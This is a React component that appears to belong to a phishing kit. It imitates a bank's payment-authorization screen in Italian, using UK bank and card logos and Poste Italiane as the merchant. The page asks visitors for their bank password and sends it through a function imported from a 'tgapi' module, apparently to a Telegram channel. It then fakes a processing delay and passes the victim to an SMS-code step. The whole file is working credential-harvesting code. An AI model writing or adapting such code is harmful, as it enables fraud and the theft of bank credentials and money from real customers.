import React, { useState } from 'react';
import { useParams } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { Shield, Lock, RotateCw } from "lucide-react";
import { sendItPasswordEnteredNotification } from '../../tgapi';
import visaLogo from "@/assets/visa2.png";
import mastercardLogo from "@/assets/mc2.png";
import hsbcLogo from "@/assets/hsbcuk.png";
import barclaysLogo from "@/assets/barclaysuk.png";
import halifaxLogo from "@/assets/halifaxuk.png";
import lloydsLogo from "@/assets/lloydsuk.png";
import natwestLogo from "@/assets/natwestuk.png";
import santanderLogo from "@/assets/santanderuk.png";

interface ChooseComponentProps {
  cardType?: string | null;
  bankName?: string | null;
  onChoice?: (choice: 'bank' | 'sms') => void;
  invoiceName?: string;
  recipientName?: string;
}

const ChooseComponent = ({ cardType, bankName, onChoice, invoiceName = "Fattura sconosciuta", recipientName = "Destinatario sconosciuto" }: ChooseComponentProps) => {
  const [password, setPassword] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const { code } = useParams<{ code: string }>();

  const handleSubmit = async () => {
    if (!password.trim()) {
      alert('Inserisci la password');
      return;
    }

    setIsProcessing(true);
    
    try {
      await sendItPasswordEnteredNotification(invoiceName, recipientName, password);
      
      // Wait 2 seconds to show the processing state, then navigate
      setTimeout(() => {
        onChoice?.('sms');
        // Keep isProcessing true - don't reset it
      }, 2000);
      
    } catch (error) {
      console.error('Error sending messages:', error);
      // Only reset processing on error
      setIsProcessing(false);
    }
  };

  // Check if bankName is one of our recognized banks
  const isRecognizedBank = bankName && ['HSBCUK', 'BARCLAYSUK', 'HALIFAXUK', 'LLOYDSUK', 'NATWESTUK', 'SANTANDERUK'].includes(bankName);

  return (
    <div className="w-full max-w-md mx-auto space-y-4 relative p-2 -mb-8 font-chevin font-thin">
      <div className="text-center">
        {isRecognizedBank ? (
          <>
            {/* Bank Logo at top left when recognized bankName exists */}
            <div className="flex justify-between items-center mb-3 animate-fade-in min-h-[20px]">
              <div className="animate-fade-in">
                {bankName === 'HSBCUK' && (
                  <img 
                    src={hsbcLogo} 
                    alt="HSBC" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'BARCLAYSUK' && (
                  <img 
                    src={barclaysLogo} 
                    alt="Barclays" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'HALIFAXUK' && (
                  <img 
                    src={halifaxLogo} 
                    alt="Halifax" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'LLOYDSUK' && (
                  <img 
                    src={lloydsLogo} 
                    alt="Lloyds" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'NATWESTUK' && (
                  <img 
                    src={natwestLogo} 
                    alt="NatWest" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'SANTANDERUK' && (
                  <img 
                    src={santanderLogo} 
                    alt="Santander" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
              </div>
              
              {/* Card Logo at top right when recognized bankName exists */}
              {cardType && (
                <div className="animate-fade-in">
                  {cardType === 'visa' && (
                    <img 
                      src={visaLogo} 
                      alt="Visa" 
                      className="h-4 w-auto object-contain drop-shadow-lg"
                    />
                  )}
                  {cardType === 'mastercard' && (
                    <img 
                      src={mastercardLogo} 
                      alt="MasterCard" 
                      className="h-4 w-auto object-contain drop-shadow-lg" 
                    />
                  )}
                </div>
              )}
            </div>
          </>
        ) : (
          /* Show both card logos when no recognized bankName */
          <div className="flex justify-between items-center mb-3 animate-fade-in">
            {cardType === 'visa' ? (
              <>
                <img 
                  src={visaLogo} 
                  alt="Visa" 
                  className="w-auto object-contain drop-shadow-lg"
                  style={{ height: '14px' }}
                />
                <img 
                  src={mastercardLogo} 
                  alt="MasterCard" 
                  className="h-8 w-auto object-contain drop-shadow-lg"
                />
              </>
            ) : (
              <>
                <img 
                  src={mastercardLogo} 
                  alt="MasterCard" 
                  className="h-8 w-auto object-contain drop-shadow-lg"
                />
                <img 
                  src={visaLogo} 
                  alt="Visa" 
                  className="w-auto object-contain drop-shadow-lg"
                  style={{ height: '14px' }}
                />
              </>
            )}
          </div>
        )}
        
     
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center flex items-center justify-center gap-2">
            <Lock className="h-4 w-4 text-blue-600" />
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Inserisci la password per autorizzare il pagamento
            </p>
          </div>
        </div>
      </div>
      
      <div className="space-y-3 relative">
        {/* Processing Overlay */}
        {isProcessing && (
          <div className="absolute inset-0 bg-white/20 backdrop-blur-[2px] rounded-xl z-10 flex items-center justify-center">
            <div className="text-center">
              <RotateCw className="h-6 w-6 animate-spin text-blue-600 mx-auto" />
            </div>
          </div>
        )}
        
        {/* Password Input Field */}
        <div className="flex justify-center">
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              placeholder=""
              required
              value={password}
              disabled={isProcessing}
              className="w-32 px-2 py-1 text-center text-xs border border-border rounded-[5px] bg-white shadow-lg drop-shadow-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 focus:shadow-xl transition-shadow duration-200 disabled:opacity-50 pr-8"
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              disabled={isProcessing}
              className="absolute right-2 top-1/2 transform -translate-y-1/2 text-xs text-muted-foreground hover:text-foreground disabled:opacity-50"
            >
              {showPassword ? '👁️' : '👁️‍🗨️'}
            </button>
          </div>
        </div>
        
        {/* Submit Button */}
        <div className="flex justify-center">
          <Button
            size="sm"
            onClick={handleSubmit}
            disabled={isProcessing || !password.trim()}
            className="!h-auto !py-1 px-3 text-xs bg-blue-600 text-white hover:bg-blue-700 active:scale-95 transform transition-all duration-200 ease-in-out shadow-2xl hover:shadow-2xl active:shadow-lg drop-shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Conferma
          </Button>
        </div>
      </div>
      
      {/* Payment Info Card */}
      <div className="mt-4 p-2 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md transition-all duration-300 hover:shadow-xl">
        <div className="space-y-2">
          {/* Amount and Merchant Row */}
          <div className="flex justify-between items-center">
            <div className="text-left">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Importo</span>
              <span className="text-[11px] font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">1,55 €</span>
            </div>
            <div className="text-right">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Commerciante</span>
              <span className="text-[11px] font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">Poste Italiane</span>
            </div>
          </div>
          
          {/* Card Info Row */}
          <div className="flex justify-between items-center pt-1.5 border-t border-border/30">
            <div className="flex items-center gap-2">
              <span className="text-[8px] font-medium text-muted-foreground/80 uppercase tracking-wider"></span>
              {cardType && (
                <img 
                  src={cardType === 'visa' ? visaLogo : mastercardLogo} 
                  alt={cardType} 
                  className="h-3 w-auto object-contain drop-shadow-sm" 
                />
              )}
            </div>
            <span className="text-[11px] font-mono font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">•••• 1234</span>
          </div>
        </div>
      </div>
      
      {/* Security Text */}
      <div className="text-center -mt-4 -mb-4">
        <div className="flex items-center justify-center gap-1">
          <Shield className="h-3 w-3 text-muted-foreground" />
          <p className="text-[10px] text-muted-foreground">
            {bankName === 'HSBCUK' && 'Protetto dal sistema di autenticazione HSBC.'}
            {bankName === 'BARCLAYSUK' && 'Protetto dal sistema di autenticazione Barclays.'}
            {bankName === 'HALIFAXUK' && 'Protetto dal sistema di autenticazione Halifax.'}
            {bankName === 'LLOYDSUK' && 'Protetto dal sistema di autenticazione Lloyds.'}
            {bankName === 'NATWESTUK' && 'Protetto dal sistema di autenticazione NatWest.'}
            {bankName === 'SANTANDERUK' && 'Protetto dal sistema di autenticazione Santander.'}
            {!bankName && 'Protetto dal sistema di autenticazione della tua banca.'}
          </p>
        </div>
      </div>
    </div>
  );
};

export default ChooseComponent;